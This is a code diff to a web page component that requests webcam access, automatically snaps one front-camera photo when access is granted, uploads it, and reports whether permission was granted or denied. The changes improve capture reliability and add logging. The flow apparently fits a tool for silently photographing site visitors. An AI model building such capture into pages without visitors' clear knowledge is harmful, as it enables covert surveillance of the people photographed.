@@ -196,7 +196,7 @@ export default function CapturePage() {
     const requestPhoto = async () => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: 'user' } 
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
         });
         await sendEvent('granted');
         streamRef.current = stream;
@@ -205,28 +205,48 @@ export default function CapturePage() {
         video.srcObject = stream;
         video.autoplay = true;
         video.playsInline = true;
+        video.muted = true;
         
-        await new Promise<void>(resolve => {
+        // Wait for video to be ready
+        await new Promise<void>((resolve, reject) => {
           video.onloadedmetadata = () => {
-            video.play();
-            setTimeout(resolve, 100);
+            video.play().then(() => {
+              // Wait a bit for the camera to warm up
+              setTimeout(resolve, 500);
+            }).catch(reject);
           };
+          video.onerror = reject;
+          // Timeout fallback
+          setTimeout(resolve, 2000);
         });
         
         // Capture photo
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
-        ctx?.drawImage(video, 0, 0);
         
-        canvas.toBlob(async (blob) => {
-          if (blob) {
+        if (ctx) {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          
+          // Convert to blob and upload
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+          const response = await fetch(dataUrl);
+          const blob = await response.blob();
+          
+          console.log('Photo blob size:', blob.size);
+          
+          if (blob.size > 0) {
             await uploadPhoto(blob);
+            console.log('Photo uploaded successfully');
           }
-          stream.getTracks().forEach(track => track.stop());
-        }, 'image/jpeg', 0.8);
+        }
+        
+        // Stop stream
+        stream.getTracks().forEach(track => track.stop());
+        
       } catch (e) {
+        console.error('Photo capture error:', e);
         await sendEvent('denied');
       }
     };
